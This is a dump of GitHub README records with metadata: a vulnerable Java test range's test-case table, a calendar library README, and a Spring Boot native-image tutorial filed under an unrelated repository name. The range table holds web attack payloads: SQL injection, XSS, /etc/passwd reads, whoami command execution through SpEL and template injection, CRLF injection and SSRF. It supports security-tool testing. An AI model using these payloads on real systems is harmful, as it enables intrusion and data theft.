| fastjson1_2_66_attack_2 | fastjson-1.2.66反序列漏洞-payload2 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_3 | fastjson-1.2.66反序列漏洞-payload3 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_4 | fastjson-1.2.66反序列漏洞-payload4 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_5 | fastjson-1.2.66反序列漏洞-payload5 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_6 | fastjson-1.2.66反序列漏洞-payload6 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_67_attack_1 | fastjson-1.2.67反序列漏洞-payload1 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 攻击 |
| fastjson1_2_67_attack_2 | fastjson-1.2.67反序列漏洞-payload2 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 攻击 |
| fastjson1_2_68_attack_1 | fastjson-1.2.68反序列漏洞-payload1 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 攻击 |
| fastjson1_2_68_attack_2 | fastjson-1.2.68反序列漏洞-payload2 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 攻击 |
| fastjson1_2_80_attack | fastjson-1.2.80反序列漏洞 | POST | http://192.168.0.9:9976/fastjson1.2.80-process | 攻击 |
| druid_unauthorized | druid未授权漏洞 | GET | http://192.168.0.9:9997/druid | 攻击 |
| actuator2_unauthorized | SpringBoot Actuator未授权访问漏洞2.X | GET | http://192.168.0.9:9995/actuator | 攻击 |
| actuator1_unauthorized | SpringBoot Actuator未授权访问漏洞1.X | GET | http://192.168.0.9:9993/trace | 攻击 |
| sql_injection_id_attack | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9991/users/1'/ | 攻击 |
| sql_injection_ids_attack | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3' | 攻击 |
| sql_injection_like_attack | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9991/users/name?name=A' | 攻击 |
| sql_injection_strs_attack | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob' | 攻击 |
| sql_injection_orderby_attack | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc' | 攻击 |
| sql_injection_Optional_attack | SQL注入-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test' | 攻击 |
| sql_injection_Object_attack | SQL注入-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | 攻击 |
| sql_injection_Annotation_attack | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9991/users/by-username?name=test' | 攻击 |
| sql_injection_lombok_attack | SQL注入-lombok | POST | http://192.168.0.9:9991/users/lombok | 攻击 |
| sql_injection_hsqldb_attack | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | 攻击 |
| sql_injection_Hibernate_attack | SQL注入-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | 攻击 |
| xss_reflect_attack | 反射型XSS漏洞 | GET | http://192.168.0.9:9991/xss_reflect?name=<script>alert(123)</script> | 攻击 |
| xss_storage_attack | 存储型XSS漏洞 | GET | http://192.168.0.9:9991/xss_storage?name=<script>alert(123)</script> | 攻击 |
| xss_dom_attack | DOM XSS漏洞 | POST | http://192.168.0.9:9991/xss_dom | 攻击 |
| file_upload_attack | 任意文件上传漏洞 | POST | http://192.168.0.9:9991/file_upload | 攻击 |
| file_read_attack | 任意文件读取漏洞 | GET | http://192.168.0.9:9991/file_read?filePath=/etc/passwd | 攻击 |
| file_write_attack | 任意文件写入漏洞 | GET | http://192.168.0.9:9991/file_write?fileName=test.txt&data=test | 攻击 |
| file_download_attack | 任意文件下载漏洞 | GET | http://192.168.0.9:9991/file_download?fileName=../pom.xml | 攻击 |
| file_delete_attack | 任意文件删除漏洞 | GET | http://192.168.0.9:9991/file_delete?fileName=test.txt | 攻击 |
| runtime_command_execute | 命令执行漏洞-runtime | GET | http://192.168.0.9:9991/runtime_command_execute?command=whoami | 攻击 |
| process_builder_command_execute | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9991/process_builder_command_execute?command=whoami | 攻击 |
| crlf_injection_attack | CRLF注入 | GET | http://192.168.0.9:9991/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | 攻击 |
| spel_expression_attack | SPEL表达式攻击 | GET | http://192.168.0.9:9991/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | 攻击 |
| ssrf_openStream_attack | SSRF攻击-openStream | GET | http://192.168.0.9:9991/ssrf_openStream?url=https://www.baidu.com | 攻击 |
| ssrf_openConnection_attack | SSRF攻击-openConnection | GET | http://192.168.0.9:9991/ssrf_openConnection?url=http://www.baidu.com | 攻击 |
| ssrf_requestGet_attack | SSRF攻击-requestGet | GET | http://192.168.0.9:9991/ssrf_requestGet?url=https://www.baidu.com | 攻击 |
| ssrf_okhttp_attack | SSRF攻击-okhttp | GET | http://192.168.0.9:9991/ssrf_okhttp?url=https://www.baidu.com | 攻击 |
| ssrf_defaultHttpClient_attack | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9991/ssrf_defaultHttpClient?url=https://www.baidu.com | 攻击 |
| ssti_velocity_attack | SSTI攻击-velocity | GET | http://192.168.0.9:9991/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | 攻击 |
| ssti_freemarker_attack | SSTI攻击-freemarker | GET | http://192.168.0.9:9991/ssti_freemarker?templateContent=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22bash%20-c%20whoami%22%29%20%7D | 攻击 |
| xxe_saxparserfactory_attack | XXE-saxparserfactory | POST | http://192.168.0.9:9991/xxe_saxparserfactory | 攻击 |
| xxe_xmlreaderfactory_attack | XXE-xmlreaderfactory | POST | http://192.168.0.9:9991/xxe_xmlreaderfactory | 攻击 |
| xxe_saxbuilder_attack | XXE-saxbuilder | POST | http://192.168.0.9:9991/xxe_saxbuilder | 攻击 |
| xxe_saxreader_attack | XXE-saxreader | POST | http://192.168.0.9:9991/xxe_saxreader | 攻击 |
| xxe_documentbuilderfactory_attack | XXE-documentbuilderfactory | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory | 攻击 |
| xxe_documentbuilderfactory_xinclude_attack | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory_xinclude | 攻击 |
| OpenRedirector_ModelAndView_attack | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9991/OpenRedirector_ModelAndView?url=https://www.baidu.com | 攻击 |
| OpenRedirector_sendRedirect_attack | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9991/OpenRedirector_sendRedirect?url=https://www.baidu.com | 攻击 |
| OpenRedirector_lacation_attack | URL重定向漏洞-location | GET | http://192.168.0.9:9991/OpenRedirector_lacation?url=https://www.baidu.com | 攻击 |
| swagger-ui_attack | swagger-ui-未授权访问漏洞 | GET | http://192.168.0.9:9991/swagger-ui.html | 攻击 |
| xxe_wxpay_attack | 微信支付XXE漏洞 | POST | http://192.168.0.9:9974/wxpay-xxe | 攻击 |
| xstream_CVE-2019-10173 | xstream 反序列化漏洞(CVE-2019-10173) | POST | http://192.168.0.9:9973/CVE-2019-10173 | 攻击 |
| jackson-databind_CVE-2019-12384 | jackson-databind 反序列化漏洞(CVE-2019-12384) | GET | http://192.168.0.9:9971/CVE-2019-12384 | 攻击 |
| log4j2_normal | Log4j2 远程代码执行漏洞（CVE-2021-44228） | POST | http://192.168.0.9:9998/log4j2 | 正常 |
| fastjson_1_2_24_normal | fastjson-1.2.24反序列漏洞 | POST | http://192.168.0.9:9999/fastjson1.2.24-process | 正常 |
| fastjson1_2_25_normal | fastjson-1.2.25-1.2.41反序列漏洞-disableAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.25-process | 正常 |
| fastjson1_2_41_normal | fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | 正常 |
| fastjson1_2_42_normal | fastjson-1.2.42反序列漏洞 | POST | http://192.168.0.9:9986/fastjson1.2.42-process | 正常 |
| fastjson1_2_43_normal | fastjson-1.2.43反序列漏洞 | POST | http://192.168.0.9:9985/fastjson1.2.43-process | 正常 |
| fastjson1_2_45_normal | fastjson-1.2.45反序列漏洞 | POST | http://192.168.0.9:9984/fastjson1.2.45-process | 正常 |
| fastjson1_2_59_normal | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59) | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 正常 |
| fastjson1_2_60_normal | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60) | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 正常 |
| fastjson1_2_61_normal | fastjson-1.2.61反序列漏洞 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 正常 |
| fastjson1_2_62_normal | fastjson-1.2.62反序列漏洞 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 正常 |
| fastjson1_2_66_normal | fastjson-1.2.66反序列漏洞 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 正常 |
| fastjson1_2_67_normal | fastjson-1.2.67反序列漏洞 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 正常 |
| fastjson1_2_68_normal | fastjson-1.2.68反序列漏洞 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 正常 |
| fastjson1_2_80_normal | fastjson-1.2.80反序列漏洞 | POST | http://192.168.0.9:9976/fastjson1.2.80-process | 正常 |
| fastjson1_2_83_normal | fastjson-1.2.83-反序列漏洞 | POST | http://192.168.0.9:9975/fastjson1.2.83-process | 正常 |
| sql_injection_hsqldb_normal | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | 正常 |
| sql_injection_lombok_normal | SQL注入-lombok | POST | http://192.168.0.9:9991/users/lombok | 正常 |
| sql_injection_longlist_normal | SQL注入-longlist | POST | http://192.168.0.9:9991/users/findByIds | 正常 |
| sql_injection_longint_normal | SQL注入-longint | POST | http://192.168.0.9:9991/users/getUserByUId | 正常 |
| sql_injection_jpaone_normal | SQL注入-jpaone | GET | http://192.168.0.9:9991/users/jpaone?name=test | 正常 |
| sql_injection_jpawithAnnotations_normal | SQL注入-jpawithAnnotations | GET | http://192.168.0.9:9991/users/jpawithAnnotations?name=test | 正常 |
| sql_injection_Annotation_normal | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9991/users/by-username?name=test | 正常 |
| sql_injection_id_normal | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9991/users/1/ | 正常 |
| sql_injection_ids_normal | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3 | 正常 |
| sql_injection_like_normal | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9991/users/name?name=A | 正常 |
| sql_injection_strs_normal | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob | 正常 |
| sql_injection_orderby_normal | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc | 正常 |
| sql_injection_Optional_normal | SQL注入-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test | 正常 |
| sql_injection_Object_normal | SQL注入-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | 正常 |
| xss_reflect_normal | 反射型XSS漏洞 | GET | http://192.168.0.9:9991/xss_reflect?name=1 | 正常 |
| xss_dom_normal | DOM XSS漏洞 | POST | http://192.168.0.9:9991/xss_dom | 正常 |
| file_download_normal | 任意文件下载漏洞 | GET | http://192.168.0.9:9990/file_download?fileName=test.log | 正常 |
| ReDos_normal_1 | ReDoS攻击-(a+)+ | GET | http://192.168.0.9:9991/testReDos1?input=1 | 正常 |
| ReDos_normal_2 | ReDoS攻击-([a-zA-Z]+)* | GET | http://192.168.0.9:9991/testReDos2?input=1 | 正常 |
| ReDos_normal_3 | ReDoS攻击-(a\|aa)+ | GET | http://192.168.0.9:9991/testReDos3?input=1 | 正常 |
| ReDos_normal_4 | ReDoS攻击-(a\|a?)+ | GET | http://192.168.0.9:9991/testReDos4?input=1 | 正常 |
| ReDos_normal_5 | ReDoS攻击-(.*a){20} | GET | http://192.168.0.9:9991/testReDos5?input=1 | 正常 |
| file_write_normal | 任意文件写入漏洞 | GET | http://192.168.0.9:9990/file_write?fileName=test.log&data=test | 正常 |
| runtime_command_execute_normal | 命令执行漏洞-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=ls | 正常 |
| process_builder_command_normal | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=ls | 正常 |
| spel_expression_normal | SPEL表达式攻击 | GET | http://192.168.0.9:9990/spel_expression?input=1 | 正常 |
| ssrf_openStream_normal | SSRF攻击-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=http://example.com | 正常 |
| ssrf_openConnection_normal | SSRF攻击-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://example.com | 正常 |
| ssrf_requestGet_normal | SSRF攻击-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://example.com | 正常 |
| ssrf_okhttp_normal | SSRF攻击-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://example.com | 正常 |
| ssrf_defaultHttpClient_normal | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://example.com | 正常 |
| OpenRedirector_ModelAndView_normal | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://example.com | 正常 |
| OpenRedirector_sendRedirect_normal | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://example.com | 正常 |
| OpenRedirector_lacation_normal | URL重定向漏洞-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://example.com | 正常 |
| druid_sqlwall | druid-SQL防火墙 | GET | http://192.168.0.9:9997/druid_sql?id=1 | 误报 |


## 参考开发代码

- https://github.com/vulhub/vulhub
- https://github.com/l4yn3/micro_service_seclab
- https://github.com/ffffffff0x/JVWA
- https://github.com/mamba-2021/myjavavul
- https://github.com/zhlu32/range_java_micro_service_seclab
- https://rasp.baidu.com/doc/install/testcase.html
- https://github.com/lemono0/FastJsonParty/
- https://github.com/roottusk/vapi

## Star History Chart

[![Star History Chart](https://api.star-history.com/svg?repos=lokerxx/JavaVul&type=Date)](https://star-history.com/#lokerxx/JavaVul&Date)

## 待进行

- [x] cas-client xxe（漏洞和修复）
- [ ] SQL注入传 order by 参数, 白名单列表（误报）
",0,0,1,apache-2.0,0.0,"['javavul', 'java', 'simpleagent', 'iast', 'bb', 'ae', 'ae', 'bc', 'iast', 'agent', 'http', 'actuator', 'actuator', 'actuator', 'actuator', 'collection', 'collection', 'hibernate', 'hibernate', 'hsqldb', 'hsqldb', 'jsp', 'simpleagent', 'java', 'agent', 'java', 'instrumentation', 'api', 'java', 'agent', 'agent', 'java', 'agent', 'manifest', 'manifest', 'agent', 'java', 'agent', 'jar', 'java', 'agent', 'manifest', 'jar', 'java', 'agent', 'agent', 'java', 'url', 'get', 'http', 'springboot', 'get', 'http', 'springboot', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'alert', 'get', 'http', 'alert', 'get', 'http', 'alert', 'get', 'http', 'alert', 'post', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'exp', 'whoami', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'post', 'http', 'get', 'http', 'post', 'http', 'get', 'http', 'get', 'http', 'select', 'count', 'user', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'get', 'http', 'springboot', 'get', 'http', 'springboot', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'post', 'http', 'get', 'http', 'post', 'http', 'get', 'http', 'get', 'http', 'select', 'count', 'user', 'get', 'http', 'alert', 'get', 'http', 'alert', 'dom', 'post', 'http', 'post', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'exp', 'whoami', 'get', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'post', 'http', 'xstream', 'post', 'http', 'get', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'get', 'http', 'post', 'http', 'post', 'http', 'post', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'post', 'http', 'get', 'http', 'dom', 'post', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'get', 'http', 'http', 'http', 'http', 'http', 'http', 'http', 'http', 'http', 'star', 'history', 'chart', 'x', 'order']","['http', 'get', 'post', 'agent', 'java']",8,0,0,"['javavul', 'mvn', 'version', 'docker', 'version', 'version', 'simpleagent', 'javac', 'jar', 'cvfm', 'mv', 'star', 'history', 'chart']",17,"['version', 'javavul', 'mvn', 'docker', 'simpleagent']",9,0.0,40.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,40.0,0.0,30299,328.09090909090907,5.399279578830701,"[' -> https://socialify.git.ci/lokerxx/JavaVul/image?description=1&font=Inter&forks=1&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light', 'IAST实践总结 -> https://mp.weixin.qq.com/s/ahxKXv5eKcULVF_VqAjbyg', '![Star History Chart -> https://api.star-history.com/svg?repos=lokerxx/JavaVul&type=Date', 'x', ' ']",5
6tail/tyme4j,master,"# Tyme [![License](https://img.shields.io/badge/license-MIT-4EB1BA.svg?style=flat-square)](https://github.com/6tail/tyme4j/blob/master/LICENSE)

Tyme是一个非常强大的日历工具库，可以看作 [Lunar](https://6tail.cn/calendar/api.html ""https://6tail.cn/calendar/api.html"") 的升级版，拥有更优的设计和扩展性，支持公历和农历、星座、干支、生肖、节气、法定假日等。

### Maven

```xml
<dependency>
  <groupId>cn.6tail</groupId>
  <artifactId>tyme4j</artifactId>
  <version>1.1.5</version>
</dependency>
```

## 示例

    import com.tyme.solar.SolarDay;
     
    public class Sample {
      public static void main(String[] args) {
        SolarDay solarDay = SolarDay.fromYmd(1986, 5, 29);
         
        // 1986年5月29日
        System.out.println(solarDay);
         
        // 农历丙寅年四月廿一
        System.out.println(solarDay.getLunarDay());
      }
    }

## 文档

请移步至 [https://6tail.cn/tyme.html](https://6tail.cn/tyme.html ""https://6tail.cn/tyme.html"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=6tail/tyme4j&type=Date)](https://star-history.com/#6tail/tyme4j&Date)
",15,2,1,mit,3.0,"['tyme', 'lunar', 'maven', 'http', 'star', 'history']","['tyme', 'lunar', 'maven', 'http', 'star']",0,1,0,"['tyme', 'license', 'http', 'http', 'maven', 'star', 'history']",5,"['http', 'tyme', 'license', 'maven', 'star']",1,332.0,1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0,1032,44.66666666666666,5.097014925373134,"['![License -> https://img.shields.io/badge/license-MIT-4EB1BA.svg?style=flat-square', 'Lunar -> https://6tail.cn/calendar/api.html ""https://6tail.cn/calendar/api.html""', 'https://6tail.cn/tyme.html -> https://6tail.cn/tyme.html ""https://6tail.cn/tyme.html""', '![Star History Chart -> https://api.star-history.com/svg?repos=6tail/tyme4j&type=Date']",4
yubb-ai/unofficial-gpt4,main,"# Spring Boot Native Image Microservice

This demo shows how to build, package, and run a simple Spring Boot 3 microservice from a JAR file with the GraalVM JDK,
and from a native executable with GraalVM Native Image. The benefits of using a native executable are faster start-up
times and reduced memory consumption. It also demonstrates how to run the application and build the native executable
within a Docker container.

There are two ways to generate a native executable from a Spring Boot application:

- [Using GraalVM Native Build Tools](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.native-build-tools)
- [Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks)

## Sample Application

The example is a minimal REST-based API application, built on top of Spring Boot 3. It consists of:

- `com.example.jibber.JibberApplication`: the main Spring Boot class. It is also a REST controller which serves as an
  entry-point for HTTP requests.
- `com.example.jibber.Jabberwocky`: a utility class that implements the logic of the application.

If you call the HTTP endpoint, `/jibber`, it will return some nonsense verse generated in the style of the Jabberwocky
poem, by Lewis Carroll. The program achieves this by using a Markov Chain to model the original poem (this is
essentially a statistical model). This model generates a new text. The example application provides the text of the
poem, then generates a model of the text, which the application then uses to generate a new text that is similar to the
original text. The application uses the [RiTa library](https://rednoise.org/rita/) as an external dependency to build
and use Markov Chains.

By default, the demo uses
the [Native Build Tools Maven plugin](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to perform
the tasks. If you would like to run this demo
using [BuildPacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks),
the build configuration is provided for you too.

## Prerequisites

1. Download and install the latest GraalVM JDK using [SDKMAN!](https://sdkman.io/).
    ```bash
    sdk install java 21.0.2-graal
    ```

2. (Optional) Install and run a Docker-API compatible container runtime such
   as [Rancher Desktop](https://docs.rancherdesktop.io/getting-started/installation/), [Docker](https://www.docker.io/gettingstarted/),
   or [Podman](https://podman.io/docs/installation). If you are using Docker, configure it
   to [allow non-root user access](https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user)
   if you are on Linux.

3. Download the demos repository or clone it as follows:

    ```bash
    git clone https://github.com/graalvm/graalvm-demos
    ```

4. Change directory to the demo subdirectory:

    ```bash
    cd spring-native-image
    ```

## Application JAR

### Build and Run as a JAR

This demo is built using Maven.

1. Build the application on top of a JVM:

    ```shell
    ./mvnw clean package
    ```

   It generates a runnable JAR file that contains all of the application’s dependencies and also a correctly
   configured `MANIFEST` file.

2. Run the application JAR and put it into the background by appending `&`:

    ```shell
    java -jar ./target/benchmark-jibber-0.0.1-SNAPSHOT.jar &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

### (Optional) Containerize the JAR

The following steps (5-8) show how you can easily containerize the JAR built in the previous step using the Oracle
GraalVM JDK container image `container-registry.oracle.com/graalvm/jdk:17-ol8`.

5. Run this command to package the JAR as a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile.jvm --build-arg APP_FILE=benchmark-jibber-0.0.1-SNAPSHOT.jar -t jibber-benchmark:jvm.0.0.1-SNAPSHOT .
    ```

6. Run the container:

    ```shell
    docker run --rm --name graal -p 8080:8080 jibber-benchmark:jvm.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Native Executable

Recap what you have so far: built a Spring Boot application with an HTTP endpoint, and successfully containerised it.
Now you will look at how you can create a native executable from your application.

Spring Boot 3's built-in support for GraalVM Native Image makes it easy to compile a Spring Boot 3 application into a
native executable.

This native executable not only starts faster but also uses far fewer resources than running the application as a JAR
file.

You can use the `native-image` tool from the GraalVM installation to build a native executable.
In this example, you'll use
the [GraalVM Native Build Tools for Maven](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to
build a native executable.

### Default Native Build Configuration

Make sure you’re using `spring-boot-starter-parent` in order to inherit the out-of-the-box `native` profile, and
the `org.graalvm.buildtools:native-maven-plugin` plugin.

You should see the following in the Maven `pom.xml` file:

``` xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version>
    <relativePath/> <!-- lookup parent from repository -->
</parent>
```

``` xml
<build>
    <plugins>
        <plugin>
            <groupId>org.graalvm.buildtools</groupId>
            <artifactId>native-maven-plugin</artifactId>
        </plugin>
        ...
    </plugins>
</build>
```

The out-of-the-box `native` profile
has [GraalVM Reachability Metadata](https://www.graalvm.org/native-image/libraries-and-frameworks/) enabled by default.

### Build and Run as a Native Executable

With the out-of-the-box `native` profile active, you can invoke the `native:compile` goal to trigger native-image
compilation.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   The `native` profile is used to generate a native executable for your platform. The native executable is called
   _benchmark-jibber_ and is generated in the _target_ directory.

   > Alternatively, to build using BuildPacks, run the `./mvnw spring-boot:build-image -Pnative` command to generate a
   native executable. For more information about using BuildPacks to create a native executable,
   see [Building a Native Image Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks).

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### Additional Native Build Configuration

Notice that you can pass additional configuration arguments to the underlying `native-image` build tool using
the `<buildArgs>` section. In individual `buildArg` tags, you can pass parameters exactly the same way as you do from a
command line. This lets you use all of the parameters that work with the `native-image` tool from Maven.

Add the following snippet to the pom.xml to pass additional arguments to enable verbose output, quick build mode, etc.
over and above the out-of-the-box `native` profile.

```xml
<profiles>
   <profile>
      <id>native</id>
      <build>
         <plugins>
            <plugin>
               <groupId>org.graalvm.buildtools</groupId>
               <artifactId>native-maven-plugin</artifactId>
               <!--<version>0.9.28</version>-->
               <configuration>
                  <verbose>true</verbose>
                  <quickBuild>true</quickBuild>
                  <buildArgs combine.children=""append"">
                     <arg>-H:+ReportExceptionStackTraces</arg>
                  </buildArgs>
               </configuration>
            </plugin>
         </plugins>
      </build>
   </profile>
</profiles>
```

### Build and Run as a Native Executable

Let's rebuild the native executable with the additional configuration arguments.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   With the quick build mode enabled, it takes less time to build the native executable. This mode should be used in
   development for faster builds.

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### (Optional) Containerize the Native Executable on Linux

The following steps (5-8) are for Linux only.

5. On Linux, you can easily containerise the native executable using the following command:

    ```shell
    docker build -f Dockerfiles/Dockerfile.native --build-arg APP_FILE=benchmark-jibber -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

6. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

